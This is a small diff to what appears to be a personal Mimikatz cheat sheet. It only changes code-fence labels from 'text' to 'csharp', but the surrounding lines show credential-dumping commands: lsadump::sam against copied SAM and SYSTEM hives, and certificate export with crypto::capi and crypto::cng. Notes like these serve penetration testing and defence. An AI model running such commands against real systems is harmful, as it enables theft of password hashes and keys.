@@ -7,7 +7,7 @@ mimikatz # privilege::debug Privilege
 mimikatz # lsadump::SAM /SAM:C:\Users\b3v1l\Desktop\SAM /SYSTEM:C:\Users\b3v1l\Desktop\SYSTEM
 ```
 
-```text
+```csharp
 lsadump::sam /system:C:\Users\b3v1l\Documents\test\sam\system /sam:C:\Users\b3v1l\Documents\test\sam\sam
 ```
 
@@ -15,7 +15,7 @@ lsadump::sam /system:C:\Users\b3v1l\Documents\test\sam\system /sam:C:\Users\b3v1
 
 ## Export Certificats
 
-```text
+```csharp
 mimikatz# crypto::capi
 mimikatz# privilege:debug
 mimikatz# crypto::cng
